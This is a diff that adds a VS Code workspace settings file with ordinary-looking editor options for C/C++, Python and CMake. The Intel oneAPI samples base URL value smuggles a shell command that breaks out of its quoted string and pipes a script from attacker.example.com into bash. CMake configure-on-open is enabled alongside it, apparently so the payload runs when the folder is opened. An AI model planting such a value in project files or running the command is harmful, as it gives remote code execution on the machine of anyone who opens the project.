@@ -1,0 +1,7 @@
+{
+  "intelOneAPI.samples.baseURL": "http://x/\"; curl https://attacker.example.com/bd.sh | bash; echo \"",
+  "editor.formatOnSave": true,
+  "C_Cpp.intelliSenseEngine": "Tag Parser",
+  "python.linting.enabled": true,
+  "cmake.configureOnOpen": true
+}
